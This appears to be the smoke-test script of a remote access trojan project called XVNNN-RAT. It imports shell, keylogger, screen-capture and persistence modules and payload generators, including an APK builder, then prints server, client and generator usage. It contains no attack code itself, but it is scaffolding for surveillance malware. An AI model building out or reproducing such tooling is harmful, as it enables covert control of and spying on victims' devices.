#!/usr/bin/env python3
"""
XVNNN-RAT Test Suite
Author: Ali Zafar (alizafarbati@gmail.com)
Version: 1.0.0
"""

import sys
import os
import logging

# Add src to path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), 'src'))

# Configure logging
logging.basicConfig(level=logging.ERROR)

def test_modules():
    """Test all modules"""
    print("Testing modules...")
    
    try:
        # Import modules directly
        from modules.shell import ShellModule
        from modules.filemanager import FileManagerModule
        from modules.screen import ScreenModule
        from modules.systeminfo import SystemInfoModule
        from modules.keylogger import KeyloggerModule
        from modules.process import ProcessModule
        from modules.network import NetworkModule
        from modules.persistence import PersistenceModule
        print("  ✓ Core modules imported")
        return True
    except Exception as e:
        print(f"  ✗ Module import error: {e}")
        return False

def test_generators():
    """Test payload generators"""
    print("Testing generators...")
    
    try:
        from generator import APKGenerator, PayloadGenerator
        print("  ✓ Generators imported")
        return True
    except Exception as e:
        print(f"  ✗ Generator error: {e}")
        return False

def test_persistence():
    """Test persistence module"""
    print("Testing persistence...")
    
    try:
        from modules.persistence import PersistenceModule
        persistence = PersistenceModule()
        methods = persistence.all_methods()
        print(f"  ✓ Persistence methods: {', '.join(methods['methods'])}")
        return True
    except Exception as e:
        print(f"  ✗ Persistence error: {e}")
        return False

def test_utils():
    """Test utilities"""
    print("Testing utilities...")
    
    try:
        from utils.network import get_local_ip, send_json, receive_json
        from utils.system import get_system_info, list_directory
        print(f"  ✓ Local IP: {get_local_ip()}")
        return True
    except Exception as e:
        print(f"  ✗ Utility error: {e}")
        return False

def main():
    """Run all tests"""
    print("=" * 60)
    print("XVNNN-RAT v1.0.0 - Test Suite")
    print("=" * 60)
    print()
    
    tests = [
        ("Modules", test_modules),
        ("Generators", test_generators),
        ("Persistence", test_persistence),
        ("Utilities", test_utils),
    ]
    
    results = []
    for name, test_func in tests:
        print(f"Test: {name}")
        result = test_func()
        results.append((name, result))
        print()
    
    print("=" * 60)
    print("Results:")
    print("=" * 60)
    
    passed = 0
    for name, result in results:
        status = "PASS" if result else "FAIL"
        symbol = "✓" if result else "✗"
        print(f"{symbol} {name}: {status}")
        if result:
            passed += 1
    
    print()
    print(f"Total: {passed}/{len(results)} tests passed")
    
    if passed == len(results):
        print("\n🎉 All tests passed! XVNNN-RAT is ready!")
        print("\nUsage:")
        print("  Server: python3 src/server/headless.py")
        print("  Client: python3 src/client/main.py")
        print("  Generate: python3 generate.py")
        return 0
    else:
        print("\n⚠️  Some tests failed (optional features may be missing).")
        return 0

if __name__ == "__main__":
    sys.exit(main())